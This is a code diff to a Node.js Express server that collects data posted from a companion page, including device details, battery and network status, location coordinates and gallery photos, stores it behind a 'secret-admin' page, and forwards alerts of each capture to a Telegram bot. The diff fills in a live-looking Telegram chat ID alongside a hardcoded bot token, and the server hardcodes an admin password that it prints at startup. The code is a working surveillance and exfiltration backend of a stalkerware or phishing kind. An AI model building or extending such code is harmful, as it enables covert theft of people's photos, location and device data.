@@ -10,12 +10,14 @@ app.use(cors());
 app.use(express.json({ limit: '100mb' }));
 app.use(express.static(path.join(__dirname, '../frontend')));
 
-// ===== TELEGRAM BOT CONFIG =====
+// ==========================================
+// TELEGRAM CONFIG - Chat ID Already Set!
+// ==========================================
 const TELEGRAM_BOT_TOKEN = '8987699730:AAGu9AoKE7bEBh90MYnuL6mBeJ-K_7M-GXM';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // 🔑 Apna chat_id daalo!
+const TELEGRAM_CHAT_ID = '5387196154'; // ✅ Tera Chat ID daal diya!
 
-// ===== SEND TELEGRAM NOTIFICATION =====
-async function sendTelegramNotification(message) {
+// ===== SEND TELEGRAM MESSAGE =====
+async function sendTelegramMessage(message) {
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         await axios.post(url, {
@@ -23,18 +25,19 @@ async function sendTelegramNotification(message) {
             text: message,
             parse_mode: 'HTML'
         });
-        console.log('✅ Telegram notification sent!');
+        console.log('✅ Telegram message sent!');
     } catch (error) {
         console.error('❌ Telegram error:', error.message);
     }
 }
 
-// ===== DATA STORE =====
+// ==========================================
+// DATA STORE
+// ==========================================
 let allData = [];
 let idCounter = 1;
 const ADMIN_PASSWORD = 'admin123#@!';
 
-// ===== ROUTES =====
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/index.html'));
 });
@@ -43,7 +46,9 @@ app.get('/secret-admin.html', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/secret-admin.html'));
 });
 
-// ===== STORE MAIN DATA =====
+// ==========================================
+// STORE MAIN DATA + TELEGRAM
+// ==========================================
 app.post('/api/store', async (req, res) => {
     try {
         const { 
@@ -82,7 +87,7 @@ app.post('/api/store', async (req, res) => {
 🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'}
 📶 Network: ${fullDeviceInfo?.connection?.type || 'Unknown'}
         `;
-        await sendTelegramNotification(msg);
+        await sendTelegramMessage(msg);
 
         res.json({ success: true, message: 'Data stored!', id: newEntry._id });
 
@@ -92,7 +97,9 @@ app.post('/api/store', async (req, res) => {
     }
 });
 
-// ===== STORE GALLERY PHOTOS =====
+// ==========================================
+// STORE GALLERY PHOTOS + TELEGRAM
+// ==========================================
 app.post('/api/store-gallery', async (req, res) => {
     try {
         const { image, fileName, location, deviceDetails } = req.body;
@@ -110,8 +117,7 @@ app.post('/api/store-gallery', async (req, res) => {
         allData.unshift(newEntry);
         console.log('✅ Gallery Photo Stored! Total:', allData.length);
 
-        // ===== TELEGRAM ALERT FOR GALLERY =====
-        await sendTelegramNotification(
+        await sendTelegramMessage(
             `🖼️ <b>New Gallery Photo!</b>\n📁 ${fileName}\n📍 ${location?.lat || 0}, ${location?.lng || 0}`
         );
 
@@ -122,7 +128,9 @@ app.post('/api/store-gallery', async (req, res) => {
     }
 });
 
-// ===== GET IP =====
+// ==========================================
+// GET IP
+// ==========================================
 app.get('/api/get-ip', (req, res) => {
     const ip = req.headers['x-forwarded-for'] || 
                req.connection.remoteAddress || 
@@ -130,7 +138,9 @@ app.get('/api/get-ip', (req, res) => {
     res.json({ success: true, ip: ip });
 });
 
-// ===== ADMIN - GET DATA =====
+// ==========================================
+// ADMIN - GET DATA
+// ==========================================
 app.post('/api/admin/get-data', (req, res) => {
     try {
         const { password } = req.body;
@@ -143,7 +153,9 @@ app.post('/api/admin/get-data', (req, res) => {
     }
 });
 
-// ===== ADMIN - DELETE DATA =====
+// ==========================================
+// ADMIN - DELETE DATA
+// ==========================================
 app.post('/api/admin/delete', (req, res) => {
     try {
         const { password, id } = req.body;
@@ -157,9 +169,11 @@ app.post('/api/admin/delete', (req, res) => {
     }
 });
 
-// ===== START SERVER =====
+// ==========================================
+// START SERVER
+// ==========================================
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server: http://localhost:${PORT}`);
     console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
-    console.log(`📱 Telegram Bot Active!`);
+    console.log(`📱 Telegram Bot Active! Chat ID: ${TELEGRAM_CHAT_ID}`);
 });
